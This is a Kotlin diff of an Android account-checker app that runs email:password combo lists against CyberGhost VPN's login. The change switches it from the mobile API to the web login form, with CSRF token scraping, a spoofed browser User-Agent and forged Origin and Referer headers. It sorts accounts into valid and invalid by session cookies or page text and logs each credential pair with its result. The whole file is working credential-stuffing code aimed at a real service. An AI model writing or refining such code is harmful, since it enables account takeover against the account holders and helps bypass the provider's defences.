@@ -16,21 +16,19 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
+import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.OkHttpClient
-import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
-import org.json.JSONObject
 import java.io.File
 import java.util.concurrent.TimeUnit
 
 class MainActivity : AppCompatActivity() {
-    private val client by lazy {
-        OkHttpClient.Builder()
-            .connectTimeout(15, TimeUnit.SECONDS)
-            .readTimeout(15, TimeUnit.SECONDS)
-            .build()
-    }
+    private val client = OkHttpClient.Builder()
+        .connectTimeout(20, TimeUnit.SECONDS)
+        .readTimeout(20, TimeUnit.SECONDS)
+        .followRedirects(true)
+        .build()
+        
     private val results = mutableListOf<Triple<String, String, String>>()
     private var combos: List<Pair<String, String>> = emptyList()
     private lateinit var log: TextView
@@ -46,7 +44,7 @@ class MainActivity : AppCompatActivity() {
             if (idx < 1) return@mapNotNull null
             Pair(s.substring(0, idx).trim(), s.substring(idx + 1).trim())
         }.filter { it.first.isNotEmpty() && it.second.isNotEmpty() }
-        status.text = "تم تحميل " + combos.size + " حساب"
+        status.text = "تم تحميل ${combos.size} حساب"
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -72,7 +70,7 @@ class MainActivity : AppCompatActivity() {
             var invalid = 0
             var err = 0
             for ((email, pwd) in combos) {
-                val (st, detail) = checkOne(email, pwd)
+                val (st, _) = checkOne(email, pwd)
                 results.add(Triple(email, pwd, st))
                 when (st) {
                     "valid" -> valid++
@@ -81,7 +79,7 @@ class MainActivity : AppCompatActivity() {
                 }
                 done++
                 status.text = "$done/$total   صح $valid   خطأ $invalid   أخطاء $err"
-                log.append("$email:$pwd -> $st ($detail)\n")
+                log.append("$email:$pwd -> $st\n")
                 (log.parent as? ScrollView)?.let { sv ->
                     sv.post { sv.fullScroll(ScrollView.FOCUS_DOWN) }
                 }
@@ -95,30 +93,57 @@ class MainActivity : AppCompatActivity() {
     private suspend fun checkOne(email: String, pwd: String): Pair<String, String> =
         withContext(Dispatchers.IO) {
             try {
-                val body = JSONObject().apply { put("email", email); put("password", pwd) }.toString()
-                val req = Request.Builder()
-                    .url("https://api.cyberghostvpn.com/1.0/login")
-                    .post(body.toRequestBody("application/json".toMediaType()))
-                    .header("User-Agent", "CyberGhost/7.9.4 (Android 13)")
-                    .header("Accept", "application/json")
+                // 1. جلب CSRF Token
+                val getReq = Request.Builder()
+                    .url("https://my.cyberghostvpn.com/en_US/login")
+                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
                     .build()
-                client.newCall(req).execute().use { r ->
-                    val t = r.body?.string() ?: ""
-                    when (r.code) {
-                        in 200..201 -> {
-                            val json = runCatching { JSONObject(t) }.getOrNull()
-                            val keys = listOf("token", "accessToken", "access_token", "sessionToken")
-                            if (json != null && keys.any { json.optString(it).isNotEmpty() }) "valid" to "ok"
-                            else if (t.lowercase().contains("2fa") || t.lowercase().contains("otp")) "2fa" to "otp"
-                            else "error" to "no_token"
-                        }
-                        401, 403 -> "invalid" to "auth"
-                        429 -> "ratelimit" to "429"
-                        else -> "error" to "http_" + r.code
+                
+                val getResp = client.newCall(getReq).execute()
+                val cookies = getResp.headers("Set-Cookie")
+                getResp.close()
+
+                var csrf = ""
+                for (c in cookies) {
+                    if (c.contains("csrfToken=")) {
+                        csrf = c.substringAfter("csrfToken=").substringBefore(";")
+                        break
+                    }
+                }
+
+                if (csrf.isEmpty()) return@withContext "error" to "no_csrf"
+
+                // 2. إرسال بيانات الدخول
+                val formBody = FormBody.Builder()
+                    .add("email", email)
+                    .add("password", pwd)
+                    .add("_token", csrf)
+                    .build()
+
+                val postReq = Request.Builder()
+                    .url("https://my.cyberghostvpn.com/login")
+                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+                    .header("Content-Type", "application/x-www-form-urlencoded")
+                    .header("Origin", "https://my.cyberghostvpn.com")
+                    .header("Referer", "https://my.cyberghostvpn.com/en_US/login")
+                    .header("Cookie", "csrfToken=$csrf")
+                    .post(formBody)
+                    .build()
+
+                client.newCall(postReq).execute().use { r ->
+                    val body = r.body?.string()?.lowercase() ?: ""
+                    val newCookies = r.headers("Set-Cookie").toString().lowercase()
+                    
+                    if (newCookies.contains("login_web_") || newCookies.contains("remember_web_") || body.contains("logout") || body.contains("sign out") || body.contains("dashboard")) {
+                        "valid" to "ok"
+                    } else if (body.contains("invalid") || body.contains("credentials") || body.contains("password")) {
+                        "invalid" to "wrong_pass"
+                    } else {
+                        "invalid" to "unknown"
                     }
                 }
             } catch (e: Exception) {
-                "error" to (e.javaClass.simpleName + ": " + (e.message ?: "net"))
+                "error" to (e.message ?: "net")
             }
         }
 
